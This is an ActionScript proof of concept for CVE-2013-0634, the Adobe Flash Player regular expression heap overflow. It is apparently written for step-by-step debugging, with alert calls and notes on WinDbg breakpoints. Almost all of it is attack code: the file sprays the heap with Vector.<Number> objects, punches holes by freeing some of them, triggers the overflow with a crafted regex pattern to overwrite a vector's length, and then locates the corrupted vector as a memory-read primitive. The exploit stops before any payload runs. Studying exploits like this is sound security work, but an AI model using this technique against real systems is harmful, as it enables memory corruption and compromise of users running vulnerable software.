package
{
    import flash.display.Sprite;
    import flash.utils.setInterval;
    import flash.external.ExternalInterface;
    
    public class Main extends Sprite
    {
        public function Main()
        {
            var myTimeout:uint = setInterval(function() : void { }, 1000);
            var objHeaps:Vector.<Object> = new <Object>[];

            // Create a lot of Vector.<Number> objects which is 0x90 bytes size
            for (var i:int = 0; i < 4000; i++) {
                 objHeaps[i] = new Vector.<Number>(16);
                 objHeaps[i][0] = 0xdeadf00d;
                 objHeaps[i][1] = i;
            }

            ExternalInterface.call('alert', 'Let\'s debug the Flash Player');

            // Find the 999th Vector.Number object
            // s 0 L?10000000 00 00 a0 01 be d5 eb 41 00 00 00 00 00 38 8f 40
            // Set a processor breakpoint using ba
            // ba w4 XXXXXXXX "dD XXXXXXXX L3; dc XXXXXXXX L70;"
            objHeaps[999][0] = 11111111; // break
            
            ExternalInterface.call('alert', 'Leaving the hole: freeing the heap');
            for (i = 1000; i < 3000; i+=2) {
                objHeaps[i] = null;
            }
            objHeaps[999][0] = 22222222; // break

            ExternalInterface.call('alert', 'CVE-2013-0634: Boom!');
            // CVE-2013-0634: Adobe Flash Player Regular Expression Heap Overflow
            // Refill a vulnerable object into the freed memory 
            // Boom! overwrite length of vector.<Number> object
            var pattern:String = "(?i)()()(?-i)||||||||||||||||||||||";
            var regexp:RegExp = new RegExp(pattern, "")
            objHeaps[999][0] = 33333333; // break

            ExternalInterface.call('alert', 'Find an object which is modified');
            // Find memory view or crafted object
            for (i = 0; i < 4000; i++) {
                try {
                    if (objHeaps[i].length != 16)
                        break;
                } catch(e:*) {}
            }
            if (i == 4000) { 
                // heap feng-shui failed
                ExternalInterface.call('alert', 'Error: heap feng-shui failed');
                return;
            }

            // Found it!
            objHeaps[999][2] = i;
            
            objHeaps[999][0] = 44444444; // break

        }
    }
}